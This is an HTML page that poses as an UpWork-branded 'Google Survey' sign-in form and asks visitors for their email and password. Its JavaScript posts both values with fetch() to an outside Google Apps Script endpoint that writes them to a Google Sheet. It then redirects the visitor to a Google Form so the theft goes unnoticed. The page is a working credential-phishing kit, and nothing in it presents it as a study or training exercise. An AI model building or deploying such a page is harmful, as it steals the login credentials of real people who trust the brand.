<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UpWork- Ranjitha Ranganath</title>
    <style>
        /* Use Flexbox to center content horizontally and vertically */
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        .container {
            text-align: center;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background-color: #f4f4f4;
        }

        form {
            display: inline-block;
            text-align: left;
        }

        label, input {
            display: block;
            margin: 10px 0;
        }

        input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }

        button:hover {
            background-color: #45a049;
        }

        .eye-icon {
            position: relative;
        }

        .eye-icon i {
            position: absolute;
            top: 10px;
            right: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="upwork.png" alt="UpWork Logo" style="width: 150px; height: auto;">
        <h2>Google Survey</h2>

        <form id="survey-form" onsubmit="handleSubmit(event)">
            <!-- Email Field -->
            <label for="email">Email</label>
            <input 
                type="text" 
                id="email" 
                name="email" 
                minlength="10" 
                pattern=".*@.*" 
                placeholder="Enter a valid email" 
                required
            >
            
            <!-- Password Field -->
            <label for="password">Password</label>
            <div class="eye-icon">
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    minlength="6" 
                    placeholder="Enter password" 
                    required
                >
                <i onclick="togglePasswordVisibility()">üëÅÔ∏è</i>
            </div>
            
            <!-- Submit Button -->
            <button type="submit">Sign in</button>
        </form>
    </div>

    <script>
        // Toggle Password Visibility
        function togglePasswordVisibility() {
            const passwordField = document.getElementById("password");
            if (passwordField.type === "password") {
                passwordField.type = "text";
            } else {
                passwordField.type = "password";
            }
        }

        // Handle Form Submission
        function handleSubmit(event) {
            event.preventDefault(); // Prevent default form submission
            
            // Get form inputs
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            // Save to Google Sheets
            saveToGoogleSheet(email, password);

            // Redirect to Google Form
            window.location.href = "https://docs.google.com/forms/d/1J--LJ32VIm-GSl7I1KOB0KIRFLWv4sOMYPBZUtmvH84/edit";
        }

        // Save Data to Google Sheets
        function saveToGoogleSheet(email, password) {
            const scriptURL = "https://script.google.com/macros/s/AKfycbyhnxlc6f--ZbBNNvaqU6pW38s__nXyg8NX0Bt6WUgiXOIFhI07yq_g5jrE2RkcGUuf/exec"; // Replace with your own script URL
            fetch(scriptURL, {
                method: "POST",
                body: new URLSearchParams({ email, password })
            })
            .then(response => console.log("Success!", response))
            .catch(error => console.error("Error!", error.message));
        }
    </script>
</body>
</html>
